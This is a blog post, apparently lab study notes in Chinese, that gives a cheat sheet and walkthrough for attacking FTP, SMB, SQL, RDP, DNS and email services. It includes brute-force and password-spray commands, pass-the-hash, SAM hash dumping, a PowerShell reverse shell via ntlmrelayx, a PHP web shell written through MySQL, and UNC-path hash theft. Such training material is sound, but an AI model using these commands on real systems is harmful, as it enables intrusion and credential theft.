@@ -1,0 +1,893 @@
+
+<!DOCTYPE html>
+<html lang="en ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Salve || attacking SERVICES</title>
+    <meta name="author" content="TiAmo">
+    <meta name="description" content="Buona notte ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/avatar.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>加载过慢请开启缓存(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Salve</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+        <a href="">
+            <span>
+                <a-icon type="compass" theme="filled" />
+            </span>
+            <span>英文博客</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Salve</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+            <a href="">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="compass" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">英文博客</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>attacking SERVICES </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/8/10
+        </span>
+
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/base" style=color:#00a596>
+                    base
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <h1 id="Attacking-FTP"><a href="#Attacking-FTP" class="headerlink" title="Attacking FTP"></a>Attacking FTP</h1><h4 id="Brute-Forcing"><a href="#Brute-Forcing" class="headerlink" title="Brute Forcing"></a>Brute Forcing</h4><p> <a target="_blank" rel="noopener" href="https://github.com/jmk-foofus/medusa">Medusa</a></p>
+<p>使用Medusa，我们可以使用选项-u指定要针对的单个用户，也可以使用选项-u提供一个包含用户名列表的文件。选项-P用于包含密码列表的文件。我们可以使用选项-M和目标协议（FTP），并使用选项-h作为目标主机名或IP地址。</p>
+<span id="more"></span>
+
+<pre><code class="shell-session">Tanin@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
+</code></pre>
+<h1 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h1><h2 id="攻击-FTP"><a href="#攻击-FTP" class="headerlink" title="攻击 FTP"></a>攻击 FTP</h2><table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ftp 192.168.2.142</code></td>
+<td>使用客户端连接到 FTP 服务器。<code>ftp</code></td>
+</tr>
+<tr>
+<td><code>nc -v 192.168.2.142 21</code></td>
+<td>使用 连接到 FTP 服务器。<code>netcat</code></td>
+</tr>
+<tr>
+<td><code>hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142</code></td>
+<td>暴力破解 FTP 服务。</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="攻击中小企业"><a href="#攻击中小企业" class="headerlink" title="攻击中小企业"></a>攻击中小企业</h2><table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>smbclient -N -L //10.129.14.128</code></td>
+<td>针对 SMB 服务的空会话测试。</td>
+</tr>
+<tr>
+<td><code>smbmap -H 10.129.14.128</code></td>
+<td>使用 进行网络共享枚举。<code>smbmap</code></td>
+</tr>
+<tr>
+<td><code>smbmap -H 10.129.14.128 -r notes</code></td>
+<td>使用 .<code>smbmap</code></td>
+</tr>
+<tr>
+<td><code>smbmap -H 10.129.14.128 --download &quot;notes\note.txt&quot;</code></td>
+<td>从共享文件夹下载特定文件。</td>
+</tr>
+<tr>
+<td><code>smbmap -H 10.129.14.128 --upload test.txt &quot;notes\test.txt&quot;</code></td>
+<td>将特定文件上传到共享文件夹。</td>
+</tr>
+<tr>
+<td><code>rpcclient -U&#39;%&#39; 10.10.110.17</code></td>
+<td>空会话与 .<code>rpcclient</code></td>
+</tr>
+<tr>
+<td><code>./enum4linux-ng.py 10.10.11.45 -A -C</code></td>
+<td>使用 自动枚举 SMB 服务。<code>enum4linux-ng</code></td>
+</tr>
+<tr>
+<td><code>crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p &#39;Company01!&#39;</code></td>
+<td>针对列表中的不同用户喷洒密码。</td>
+</tr>
+<tr>
+<td><code>impacket-psexec administrator:&#39;Password123!&#39;@10.10.110.17</code></td>
+<td>使用 连接到 SMB 服务。<code>impacket-psexec</code></td>
+</tr>
+<tr>
+<td><code>crackmapexec smb 10.10.110.17 -u Administrator -p &#39;Password123!&#39; -x &#39;whoami&#39; --exec-method smbexec</code></td>
+<td>使用 对 SMB 服务执行命令。<code>crackmapexec</code></td>
+</tr>
+<tr>
+<td><code>crackmapexec smb 10.10.110.0/24 -u administrator -p &#39;Password123!&#39; --loggedon-users</code></td>
+<td>枚举登录用户。</td>
+</tr>
+<tr>
+<td><code>crackmapexec smb 10.10.110.17 -u administrator -p &#39;Password123!&#39; --sam</code></td>
+<td>从 SAM 数据库中提取哈希。</td>
+</tr>
+<tr>
+<td><code>crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE</code></td>
+<td>使用哈希传递技术在目标主机上进行身份验证。</td>
+</tr>
+<tr>
+<td><code>impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146</code></td>
+<td>使用 转储 SAM 数据库。<code>impacket-ntlmrelayx</code></td>
+</tr>
+<tr>
+<td><code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c &#39;powershell -e &lt;base64 reverse shell&gt;</code></td>
+<td>使用 执行基于 PowerShell 的反向外壳。<code>impacket-ntlmrelayx</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="攻击-SQL-数据库"><a href="#攻击-SQL-数据库" class="headerlink" title="攻击 SQL 数据库"></a>攻击 SQL 数据库</h2><table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>mysql -u julio -pPassword123 -h 10.129.20.13</code></td>
+<td>连接到 MySQL 服务器。</td>
+</tr>
+<tr>
+<td><code>sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P &#39;MyPassword!&#39; -y 30 -Y 30</code></td>
+<td>连接到 MSSQL 服务器。</td>
+</tr>
+<tr>
+<td><code>sqsh -S 10.129.203.7 -U julio -P &#39;MyPassword!&#39; -h</code></td>
+<td>从 Linux 连接到 MSSQL 服务器。</td>
+</tr>
+<tr>
+<td><code>sqsh -S 10.129.203.7 -U .\\julio -P &#39;MyPassword!&#39; -h</code></td>
+<td>从 Linux 连接到 MSSQL 服务器，而 MSSQL 服务器使用 Windows 身份验证机制。</td>
+</tr>
+<tr>
+<td><code>mysql&gt; SHOW DATABASES;</code></td>
+<td>显示 MySQL 中的所有可用数据库。</td>
+</tr>
+<tr>
+<td><code>mysql&gt; USE htbusers;</code></td>
+<td>在 MySQL 中选择一个特定的数据库。</td>
+</tr>
+<tr>
+<td><code>mysql&gt; SHOW TABLES;</code></td>
+<td>在 MySQL 中显示所选数据库中的所有可用表。</td>
+</tr>
+<tr>
+<td><code>mysql&gt; SELECT * FROM users;</code></td>
+<td>从MySQL中的“用户”表中选择所有可用条目。</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; SELECT name FROM master.dbo.sysdatabases</code></td>
+<td>显示 MSSQL 中的所有可用数据库。</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; USE htbusers</code></td>
+<td>在 MSSQL 中选择特定的数据库。</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES</code></td>
+<td>在 MSSQL 中显示所选数据库中的所有可用表。</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; SELECT * FROM users</code></td>
+<td>从 MSSQL 中的“用户”表中选择所有可用条目。</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; EXECUTE sp_configure &#39;show advanced options&#39;, 1</code></td>
+<td>允许更改高级选项。</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; EXECUTE sp_configure &#39;xp_cmdshell&#39;, 1</code></td>
+<td>启用xp_cmdshell。</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; RECONFIGURE</code></td>
+<td>在每个sp_configure命令之后使用以应用更改。</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; xp_cmdshell &#39;whoami&#39;</code></td>
+<td>从 MSSQL 服务器执行系统命令。</td>
+</tr>
+<tr>
+<td><code>mysql&gt; SELECT &quot;&lt;?php echo shell_exec($_GET[&#39;c&#39;]);?&gt;&quot; INTO OUTFILE &#39;/var/www/html/webshell.php&#39;</code></td>
+<td>使用 MySQL 创建一个文件。</td>
+</tr>
+<tr>
+<td><code>mysql&gt; show variables like &quot;secure_file_priv&quot;;</code></td>
+<td>检查安全文件权限是否为空，以读取系统上本地存储的文件。</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; SELECT * FROM OPENROWSET(BULK N&#39;C:/Windows/System32/drivers/etc/hosts&#39;, SINGLE_CLOB) AS Contents</code></td>
+<td>读取 MSSQL 中的本地文件。</td>
+</tr>
+<tr>
+<td><code>mysql&gt; select LOAD_FILE(&quot;/etc/passwd&quot;);</code></td>
+<td>在 MySQL 中读取本地文件。</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; EXEC master..xp_dirtree &#39;\\10.10.110.17\share\&#39;</code></td>
+<td>使用 MSSQL 中的命令进行哈希窃取。<code>xp_dirtree</code></td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; EXEC master..xp_subdirs &#39;\\10.10.110.17\share\&#39;</code></td>
+<td>使用 MSSQL 中的命令进行哈希窃取。<code>xp_subdirs</code></td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; SELECT srvname, isremote FROM sysservers</code></td>
+<td>标识 MSSQL 中的链接服务器。</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; EXECUTE(&#39;select @@servername, @@version, system_user, is_srvrolemember(&#39;&#39;sysadmin&#39;&#39;)&#39;) AT [10.0.0.12\SQLEXPRESS]</code></td>
+<td>标识用户及其在 MSSQL 中用于远程连接的权限。</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="攻击-RDP"><a href="#攻击-RDP" class="headerlink" title="攻击 RDP"></a>攻击 RDP</h2><table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c &#39;password123&#39;</code></td>
+<td>针对 RDP 服务喷洒密码。</td>
+</tr>
+<tr>
+<td><code>hydra -L usernames.txt -p &#39;password123&#39; 192.168.2.143 rdp</code></td>
+<td>暴力破解 RDP 服务。</td>
+</tr>
+<tr>
+<td><code>rdesktop -u admin -p password123 192.168.2.143</code></td>
+<td>在 Linux 中使用连接到 RDP 服务。<code>rdesktop</code></td>
+</tr>
+<tr>
+<td><code>tscon #&#123;TARGET_SESSION_ID&#125; /dest:#&#123;OUR_SESSION_NAME&#125;</code></td>
+<td>在没有密码的情况下模拟用户。</td>
+</tr>
+<tr>
+<td><code>net start sessionhijack</code></td>
+<td>执行 RDP 会话劫持。</td>
+</tr>
+<tr>
+<td><code>reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</code></td>
+<td>在目标 Windows 主机上启用“受限管理模式”。</td>
+</tr>
+<tr>
+<td><code>xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA</code></td>
+<td>使用哈希传递技术在没有密码的情况下登录目标主机。</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="攻击域名解析"><a href="#攻击域名解析" class="headerlink" title="攻击域名解析"></a>攻击域名解析</h2><table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>dig AXFR @ns1.inlanefreight.htb inlanefreight.htb</code></td>
+<td>对特定名称服务器执行 AXFR 区域传输尝试。</td>
+</tr>
+<tr>
+<td><code>subfinder -d inlanefreight.com -v</code></td>
+<td>暴力破解子域。</td>
+</tr>
+<tr>
+<td><code>host support.inlanefreight.com</code></td>
+<td>指定子域的 DNS 查找。</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="攻击电子邮件服务"><a href="#攻击电子邮件服务" class="headerlink" title="攻击电子邮件服务"></a>攻击电子邮件服务</h2><table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>host -t MX microsoft.com</code></td>
+<td>指定域的邮件服务器的 DNS 查找。</td>
+</tr>
+<tr>
+<td>&#96;dig mx inlanefreight.com</td>
+<td>grep “MX”</td>
+</tr>
+<tr>
+<td><code>host -t A mail1.inlanefreight.htb.</code></td>
+<td>指定子域的 IPv4 地址的 DNS 查找。</td>
+</tr>
+<tr>
+<td><code>telnet 10.10.110.20 25</code></td>
+<td>连接到 SMTP 服务器。</td>
+</tr>
+<tr>
+<td><code>smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7</code></td>
+<td>对指定主机使用 RCPT 命令进行 SMTP 用户枚举。</td>
+</tr>
+<tr>
+<td><code>python3 o365spray.py --validate --domain msplaintext.xyz</code></td>
+<td>验证指定域的 Office365 使用情况。</td>
+</tr>
+<tr>
+<td><code>python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz</code></td>
+<td>枚举在指定域上使用 Office365 的现有用户。</td>
+</tr>
+<tr>
+<td><code>python3 o365spray.py --spray -U usersfound.txt -p &#39;March2022!&#39; --count 1 --lockout 1 --domain msplaintext.xyz</code></td>
+<td>针对对指定域使用 Office365 的用户列表进行密码喷涂。</td>
+</tr>
+<tr>
+<td><code>hydra -L users.txt -p &#39;Company01!&#39; -f 10.10.110.20 pop3</code></td>
+<td>暴力破解 POP3 服务。</td>
+</tr>
+<tr>
+<td><code>swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header &#39;Subject: Notification&#39; --body &#39;Message&#39; --server 10.10.11.213</code></td>
+<td>测试 SMTP 服务是否存在开放中继漏洞。</td>
+</tr>
+</tbody></table>
+<h1 id="Attacking-FTP-1"><a href="#Attacking-FTP-1" class="headerlink" title="Attacking FTP"></a>Attacking FTP</h1><h4 id="Brute-Forcing-1"><a href="#Brute-Forcing-1" class="headerlink" title="Brute Forcing"></a>Brute Forcing</h4><h4 id="FTP-Bounce-Attack"><a href="#FTP-Bounce-Attack" class="headerlink" title="FTP Bounce Attack"></a>FTP Bounce Attack</h4><p>FTP反弹攻击 FTP反弹攻击是一种使用FTP服务器将出站流量传递到网络上另一个设备的网络攻击。攻击者使用PORT命令诱骗FTP连接运行命令并从预期服务器以外的设备获取信息。 假设我们的目标是暴露在互联网上的FTP服务器FTP_DMZ。同一网络中的另一个设备Internal_DMZ没有暴露在互联网上。我们可以使用与FTP_DMZ服务器的连接，使用FTP Bounce攻击扫描Internal_DMZ，并获取有关服务器打开端口的信息。然后，我们可以将这些信息作为攻击基础设施的一部分。</p>
+<p>Nmap-b标志可用于执行FTP反弹攻击：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
+</code></pre>
+<h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><blockquote>
+<p>FTP 服务在哪个端口上运行？</p>
+<p>FTP 服务器可以使用什么用户名？</p>
+<p>使用发现的用户名及其密码通过SSH登录并获取标志.txt文件。提交内容作为您的答案。</p>
+</blockquote>
+<p>先扫描主机：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111503815.png" alt="image-20230811150309711">发现都有防火墙保护，挨个端口扫描发现2121端口开了ftp服务</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111504966.png" alt="image-20230811150445925"></p>
+<p>他这里允许匿名登录ftp，链接上去后发现了一个密码本和一个用户列表，用hydra或者Medusa爆破一下：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111506125.png" alt="image-20230811150617076"></p>
+<p>然后ssh登录即可</p>
+<h1 id="Attacking-SMB"><a href="#Attacking-SMB" class="headerlink" title="Attacking SMB"></a>Attacking SMB</h1><p>根据SMB实现和操作系统的不同，我们将使用Nmap获得不同的信息。请记住，在针对Windows操作系统时，版本信息通常不会包含在Nmap扫描结果中。相反，Nmap将尝试猜测操作系统的版本。然而，我们通常需要其他扫描来确定目标是否容易受到特定攻击。我们将在本节稍后介绍搜索已知漏洞。现在，让我们扫描端口139和445 TCP。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
+Nmap scan report for 10.129.14.128
+Host is up (0.00024s latency).
+
+PORT    STATE SERVICE     VERSION
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+MAC Address: 00:00:00:00:00:00 (VMware)
+
+Host script results:
+|_nbstat: NetBIOS name: HTB, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-09-19T13:16:04
+|_  start_date: N/A
+</code></pre>
+<p>Nmap扫描揭示了目标的基本信息： SMB版本（Samba-smbd 4.6.2） 主机名HTB 操作系统是基于SMB实现的Linux</p>
+<h4 id="Anonymous-Authentication"><a href="#Anonymous-Authentication" class="headerlink" title="Anonymous Authentication"></a>Anonymous Authentication</h4><p>如果我们找到一个不需要用户名和密码或找到有效凭据的SMB服务器，我们可以获得共享、用户名、组、权限、策略、服务等的列表。大多数与SMB交互的工具都允许空会话连接，包括smbclient、smbmap、rpcclient或enum4linux。让我们探讨一下如何使用null身份验证与文件共享和RPC进行交互。</p>
+<h4 id="File-Share"><a href="#File-Share" class="headerlink" title="File Share"></a>File Share</h4><p>使用smbclient，我们可以使用选项-L显示服务器的共享列表，使用选项-N，我们告诉smbclient使用null会话。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ smbclient -N -L //10.129.14.128
+
+        Sharename       Type      Comment
+        -------      --     -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        notes           Disk      CheckIT
+        IPC$            IPC       IPC Service (DEVSM)
+SMB1 disabled no workgroup available
+</code></pre>
+<p>Smbmap是另一个帮助我们枚举网络共享和访问相关权限的工具。smbmap的一个优点是它为每个共享文件夹提供了一个权限列表。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -H 10.129.14.128
+
+[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
+        Disk                                                    Permissions     Comment
+        --                                                   ---------    -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       IPC Service (DEVSM)
+        notes                                                   READ, WRITE     CheckIT
+</code></pre>
+<p>使用带有-r或-r（递归）选项的smbmap，可以浏览目录：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -H 10.129.14.128 -r notes
+
+[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
+        Disk                                                    Permissions     Comment
+        --                                                   ---------    -------
+        notes                                                   READ, WRITE
+        .\notes\*
+        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
+        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
+        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
+        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
+        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
+        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
+        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
+        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
+</code></pre>
+<p>从上面的例子中，权限被设置为READ和WRITE，可以用来上传和下载文件。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -H 10.129.14.128 --download &quot;notes\note.txt&quot;
+
+[+] Starting download: notes\note.txt (116 bytes)
+[+] File output to: /htb/10.129.14.128-notes_note.txt
+</code></pre>
+<pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt &quot;notes\test.txt&quot;
+
+[+] Starting upload: test.txt (20 bytes)
+[+] Upload complete.
+</code></pre>
+<h4 id="Remote-Procedure-Call-RPC"><a href="#Remote-Procedure-Call-RPC" class="headerlink" title="Remote Procedure Call (RPC)"></a>Remote Procedure Call (RPC)</h4><p>我们可以使用带有空会话的rpcclient工具来枚举工作站或域控制器。 rpcclient工具为我们提供了许多不同的命令，用于在SMB服务器上执行特定功能，以收集信息或修改服务器属性（如用户名）。我们可以使用SANS研究所的这份备忘单，也可以查看客户端手册页上所有这些功能的完整列表。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ rpcclient -U&#39;%&#39; 10.10.110.17
+
+rpcclient $&gt; enumdomusers
+
+user:[mhope] rid:[0x641]
+user:[svc-ata] rid:[0xa2b]
+user:[svc-bexec] rid:[0xa2c]
+user:[roleary] rid:[0xa36]
+user:[smorgan] rid:[0xa37]
+</code></pre>
+<p>Brute Forcing和密码喷雾 当暴力强制时，我们会对一个帐户尝试尽可能多的密码，但如果我们达到阈值，它会锁定一个帐户。我们可以使用暴力，如果我们知道的话，可以在达到阈值之前停止。否则，我们不建议使用暴力。 密码喷洒是一个更好的选择，因为我们可以用一个通用密码锁定用户名列表，以避免帐户锁定。如果我们知道帐户锁定阈值，我们可以尝试多个密码。通常，两到三次尝试是安全的，只要我们在两次尝试之间等待30-60分钟。让我们探索一下<a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> 工具，它包括执行密码喷涂的功能。 使用CrackMapExec（CME），我们可以针对多个IP，使用大量用户和密码。让我们来探索一个密码喷涂的日常使用案例。要对一个IP执行密码喷洒，我们可以使用选项-u指定带有用户列表的文件，使用选项-p指定密码。这将尝试使用提供的密码对列表中的每个用户进行身份验证。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p &#39;Company01!&#39; --local-auth
+
+SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
+SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE 
+SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE 
+SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE 
+SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE 
+SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE 
+SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE 
+SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE 
+</code></pre>
+<blockquote>
+<p>注意：默认情况下，CME将在成功登录后退出。使用–continue-on-success标志将继续喷洒，即使在找到有效密码后也是如此。它对于向大型用户列表喷洒单个密码非常有用。此外，如果我们的目标是一台未加入域的计算机，我们将需要使用选项–local-auth。有关更详细的研究密码喷洒，请参阅Active Directory枚举和攻击模块。</p>
+</blockquote>
+<h4 id="Remote-Code-Execution-RCE"><a href="#Remote-Code-Execution-RCE" class="headerlink" title="Remote Code Execution (RCE)"></a>Remote Code Execution (RCE)</h4><h4 id="Impacket-PsExec"><a href="#Impacket-PsExec" class="headerlink" title="Impacket PsExec"></a>Impacket PsExec</h4><pre><code class="shell-session">Tanin@htb[/htb]$ impacket-psexec administrator:&#39;Password123!&#39;@10.10.110.17
+</code></pre>
+<h4 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h4><p>我们可以用来运行CMD或PowerShell的另一个工具是CrackMapExec。CrackMapExec的一个优点是可以一次在多个主机上运行命令。要使用它，我们需要指定协议、smb、IP地址或IP地址范围，选项-u表示用户名，-p表示密码，选项-x用于运行cmd命令，大写-x用于运行PowerShell命令。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p &#39;Password123!&#39; -x &#39;whoami&#39; --exec-method smbexec
+
+SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
+SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)
+SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec
+SMB         10.10.110.17 445    WIN7BOX  nt authority\system
+</code></pre>
+<blockquote>
+<p>注意：如果没有定义–exec方法，CrackMapExec将尝试执行atexec方法，如果失败，您可以尝试指定–exec方式smbexec。</p>
+</blockquote>
+<h4 id="Enumerating-Logged-on-Users"><a href="#Enumerating-Logged-on-Users" class="headerlink" title="Enumerating Logged-on Users"></a>Enumerating Logged-on Users</h4><p>想象一下，我们在一个有多台机器的网络中。其中一些共享相同的本地管理员帐户。在这种情况下，我们可以使用CrackMapExec枚举同一网络中所有机器上的登录用户10.10.110.17&#x2F;24，这加快了我们的枚举过程。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p &#39;Password123!&#39; --loggedon-users
+</code></pre>
